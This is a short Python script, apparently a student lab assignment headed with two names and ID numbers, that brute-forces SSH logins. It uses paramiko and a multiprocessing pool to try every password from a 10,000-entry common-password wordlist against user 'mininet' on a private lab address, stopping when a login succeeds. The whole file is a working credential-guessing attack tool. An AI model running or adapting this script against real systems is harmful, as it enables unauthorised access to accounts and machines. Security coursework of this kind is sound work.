"""
Luyckx Marco 496283
Bouhnine Ayoub 500048

Brute-forcing SSH
"""
#!/usr/bin/env python3
import os
import sys
import time
import paramiko
import multiprocessing


def ssh_connect(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
        print(f"Found Password : {password} for account : {username}")
        return password
    except paramiko.ssh_exception.AuthenticationException:
        print(f"Incorrect Login : {password}")
    finally:
        ssh.close()


def read_passwords(filename):
    with open(filename, 'r') as f:
        for line in f:
            yield line.strip()


if __name__ == "__main__":
    host = "192.168.56.101"
    username = "mininet"
    wordlist = "10k-most-common.txt"

    if not os.path.exists(wordlist):
        print("\nPlease move the file '10k-most-common.txt' into the correct directory")
        sys.exit(1)

    print(
        f'Starting threaded SSH bruteforce on {host} with account : {username}')
    start_time = time.time()
    found_password = None

    with multiprocessing.Pool() as pool:
        for password in pool.imap_unordered(ssh_connect, read_passwords(wordlist)):
            if password:
                found_password = password
                pool.terminate()
                break

    if found_password:
        print(f'Password Found : {found_password}')
    else:
        print('Password Not Found')

    print('Time taken :', time.time() - start_time)
